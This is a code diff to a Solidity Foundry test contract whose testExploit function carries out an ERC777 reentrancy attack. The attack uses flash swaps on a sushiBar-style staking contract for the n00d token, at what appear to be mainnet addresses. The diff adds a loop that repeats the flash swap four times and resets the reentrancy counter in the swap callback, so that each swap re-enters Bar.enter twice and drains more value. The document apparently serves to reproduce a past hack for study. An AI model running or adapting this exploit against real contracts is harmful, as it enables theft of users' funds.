@@ -23,7 +23,7 @@ contract ContractTest is DSTest{
     IERC20 Xn00d = IERC20(0x3561081260186E69369E6C32F280836554292E08);
     sushiBar Bar = sushiBar(0x3561081260186E69369E6C32F280836554292E08);
     ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
-    uint i = 0;
+    uint i;
     uint enterAmount = 0;
     uint n00dReserve;
     
@@ -36,6 +36,13 @@ contract ContractTest is DSTest{
     function testExploit() public{
         registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
         n00d.approve(address(Bar), type(uint).max);
+        // The swap is performed 4 times.
+        int j;
+        for (j = 1; j < 5; j++) {
+            (n00dReserve, , ) = Pair.getReserves();
+            Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));
+        }
+        // Now all funds can be swapped back to WETH.
         (n00dReserve, , ) = Pair.getReserves();
         Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));
         uint amountIn = n00d.balanceOf(address(this));
@@ -52,6 +59,8 @@ contract ContractTest is DSTest{
     }
 
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{
+        // Resetting count to 0 so we perform re-entry twice each time we swap/loan.
+        i = 0;
         enterAmount = n00d.balanceOf(address(this)) / 5;
         Bar.enter(enterAmount);
         Bar.leave(Xn00d.balanceOf(address(this)));
@@ -66,7 +75,7 @@ contract ContractTest is DSTest{
         bytes calldata userData,
         bytes calldata operatorData
     ) external {
-        if(to == address(Bar) && i < 4){
+        if(to == address(Bar) && i < 2){
             i++;
             Bar.enter(enterAmount);
         }
